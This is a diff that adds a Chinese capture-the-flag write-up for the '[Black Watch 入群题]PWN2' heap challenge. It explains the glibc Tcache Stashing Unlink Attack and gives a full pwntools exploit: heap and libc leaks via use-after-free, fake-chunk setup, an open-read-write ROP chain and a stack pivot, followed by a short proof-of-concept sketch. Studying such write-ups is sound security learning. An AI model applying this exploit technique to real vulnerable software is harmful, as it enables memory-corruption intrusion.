@@ -3579,7 +3579,165 @@ p.send(payload2)
 p.interactive()
 ```
 
+## [Black Watch 入群题]PWN2
 
+这个题目的手法我是第一次遇到，这里我们直接说他的前提知识点了，这是一个很有意思的攻击方法，目前即使在glibc2.36都是可以使用的
+
+当我们从small bin拿出来chunk的时候，程序会检查当前small bin链上是否还有剩余堆块，如果有的话并且tcache bin的链上还有空余位置(前提是不能为空，不然即使有空余也不行），就会把剩下的堆块链进tcachebin里面，但是链进去的时候没有进行链表的检查，所以我们可以在这个时候攻击这个即将链进tcachebin的堆块的bk指针，就可以达到任意地址写一个main_arena的效果。
+
+这个攻击手法的核心，calloc函数，这个函数最初只是方便同时创建多个大小相同的堆块，但是它在取出堆块的时候，会越过tcachebin，所以想用Tcache Stashing Unlink Attack一定至少可以用一次calloc
+
+整体的利用思路如下：
+
+申请五个大小为0x100的chunk备用。（待会用于释放掉之后成为tcache stash unlink利用中的那5个tcache）
+
+利用UAF，通过申请大小为0x410的chunk来在unsortedbin中留下两个大小为0x410的chunk，分别用于泄露堆地址和libc地址
+
+申请两个大小为0x310的chunk，使其切割上述两个大小为0x410的chunk为两个大小为0x100的chunk。再申请一个使得都进入small bin。
+
+释放五个最开始备用的chunk进入tcache。同时构造一个fake_chunk，在其bk处写target_addr - 0x10
+
+控制后进入smallbin的chunk的bk指针，使其指向fake_chunk。
+
+申请一个大小为0x100的chunk进行一次calloc，完成target_addr写一个堆地址。
+进入secret函数中利用栈溢出，栈迁移到提前布置了orw的堆块中进行读取flag。
+
+下面是这个题目的exp
+
+```py
+from pwn import *
+
+p = process('/home/fofa/black_watch')
+# p = remote('node5.buuoj.cn', 28911)
+libc = ELF('/home/fofa/libc-2.29.so')
+
+context.arch = 'amd64'
+
+ru = lambda s : p.recvuntil(s)
+sl = lambda s : p.sendline(s)
+sn = lambda s : p.send(s)
+rv = lambda s : p.recv(s)
+sla = lambda r, s : p.sendlineafter(r, s)
+sa = lambda r, s : p.sendafter(r, s)
+
+def debug(s):
+    gdb.attach(p, '''
+        source ~/libc/loadsym.py
+        loadsym ~/libc/2.29/64/libc-2.29.debug.so
+    ''' + s)
+
+def alloc(index, size, content):
+    sla(b'input: ', b'1')
+    sla(b'idx:', str(index).encode())
+    sla(b'0x400):', str(size))
+    sa(b'content:', content)
+
+def delete(index):
+    sla(b'input: ', b'2')
+    sla(b'idx:', str(index).encode())
+
+def edit(index, content):
+    sla(b'input: ', b'3')
+    sla(b'idx:', str(index).encode())
+    sa(b'content:', content)
+
+def show(index):
+    sla(b'input: ', b'4')
+    sla(b'idx:', str(index).encode())
+
+alloc(0, 4, b'a')
+alloc(1, 4, b'a')
+
+delete(0)
+delete(1)
+
+show(1)
+
+p.recv()
+heap_base = u64(rv(6).ljust(8, b'\x00')) - 0x1270
+success('heap_base -> {}'.format(hex(heap_base)))
+
+for i in range(5):
+    alloc(0, 4, b'a')
+    delete(0)
+
+alloc(0, 4, b'a')
+
+for i in range(6):
+    alloc(1, 3, b'a')
+    delete(1)
+
+delete(0)
+
+#leak libc
+show(0)
+
+libc_base = u64(rv(6)[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
+success('libc_base -> {}'.format(hex(libc_base)))
+
+smallbin_1 = heap_base + 0x2fd0
+fake_chunk_addr = heap_base + 0x4540
+magic_heap = heap_base + 0x260 + 0x800 - 0x10
+smallbin_main_arena = libc_base + libc.sym['__malloc_hook'] + 880
+rop_chunk = heap_base + 0x2fe0
+
+alloc(2, 2, b'a')
+alloc(3, 4, p64(smallbin_1) + p64(magic_heap))
+gdb.attach(p)
+edit(0, b'a' * 0xf0 + p64(0) + p64(0x311) + p64(0x1234) + p64(fake_chunk_addr))
+
+pop_rdi_ret = libc_base + 0x26542
+pop_rsi_ret = libc_base + 0x26f9e
+pop_rdx_ret = libc_base + 0x12bda6
+open = libc_base + libc.sym['open']
+read = libc_base + libc.sym['read']
+write = libc_base + libc.sym['write']
+leave_ret = libc_base + 0x58373
+#
+payload = b'flag' + b'\x00' * 4
+payload += p64(pop_rdi_ret) + p64(rop_chunk)
+payload += p64(pop_rsi_ret) + p64(0) + p64(open)
+payload += p64(pop_rdi_ret) + p64(3)
+payload += p64(pop_rsi_ret) + p64(heap_base + 0x260)
+payload += p64(pop_rdx_ret) + p64(0x40) + p64(read)
+payload += p64(pop_rdi_ret) + p64(1)
+payload += p64(pop_rsi_ret) + p64(heap_base + 0x260)
+payload += p64(pop_rdx_ret) + p64(0x40) + p64(write)
+
+#tcache stashing unlink attack
+gdb.attach(p)
+alloc(4, 3, payload)
+
+#punch
+#debug('b *$rebase(0x1474)')
+# sla(b'input: ', b'666')
+# sa(b'What do you want to say?', b'a' * 0x80 + p64(rop_chunk) + p64(leave_ret))
+
+p.interactive()
+```
+
+下面是这个题目的poc
+
+```py
+#我们假设最后的堆块地址是target，那我们最终是向target+0x8（也就是fd指针）写入main_arena的地址
+#绕过保护，target+0x8的地方改为一个可读写地址
+for i in range(9):
+    add(0x90)#0,1,2,3...
+for i in range(3,9):
+    free(i)
+free(1)
+free(0)
+free(2)#这里是为了防止unlink
+add(0xa0)
+add(0x90)
+add(0x90)
+#完成布局
+edit(2)#修改bk为target-0x10
+call0c(1,0x90)
+#触发攻击
+malloc(0x90)
+#这个就是伪造的堆块
+```
 
 ## 浙江省赛初赛
 
